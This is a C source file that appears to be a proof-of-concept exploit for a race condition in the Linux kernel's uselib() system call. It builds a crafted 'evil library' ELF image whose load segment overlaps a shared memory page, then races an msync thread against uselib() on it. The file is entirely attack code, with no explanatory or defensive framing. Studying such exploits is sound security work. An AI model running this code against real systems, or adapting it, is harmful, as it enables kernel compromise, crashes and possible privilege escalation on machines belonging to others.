#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

#include <stdio.h>
 
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/fcntl.h>
#include <sys/mman.h>
#include <linux/elf.h>

#include <pthread.h>

#define BASE (char *) 0x60000000
#define EATFILE "TTeatfile"
#define LIBFILE "TTlib"

char *swapmem = NULL;
char *base = BASE;
int fd3;
volatile int race_start = 0;

struct libimg {
  	Elf32_Ehdr elf;
  	Elf32_Phdr ph;
};

/* the image of the evil library. */
struct libimg limg = {
  	{
  	e_ident: "\177ELF",
  	e_type: ET_EXEC,
  	e_machine: EM_386,
  	e_phoff: sizeof(Elf32_Ehdr),
  	e_ehsize: sizeof(Elf32_Ehdr),
  	e_phentsize: sizeof(Elf32_Phdr),
  	e_phnum: 1
  	},
  	{
  	p_type: PT_LOAD,
  	p_vaddr: 0,
  	p_memsz: 0
  	}
};

static void make_lib(char *name)
{
  	int libfd = open(name, O_CREAT|O_RDWR|O_TRUNC, 0700);
  	write(libfd, &limg, sizeof(limg));
  	fchmod(libfd, 0700);
}

void *thread(void *d)
{
	while(!race_start);
	if( msync(swapmem, PAGE_SIZE, MS_SYNC) < 0)
  	{
		perror("msync failed with error:");
	}
}

pthread_t msync_thd;
int main(int argc, char *argv[])
{

	fd3 = open(EATFILE, O_CREAT|O_RDWR|O_TRUNC, 0777);
	ftruncate(fd3, PAGE_SIZE);
	swapmem = base;
	mmap(swapmem, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, fd3, 0);

	close(fd3);

	pthread_create(&msync_thd, NULL, &thread, NULL);
	
	race_start = 1;

  	limg.ph.p_vaddr = (unsigned) swapmem;
  	limg.ph.p_memsz = PAGE_SIZE ;  make_lib(LIBFILE);

  	uselib(LIBFILE);

	pthread_join(msync_thd, NULL);

	return 0;
}
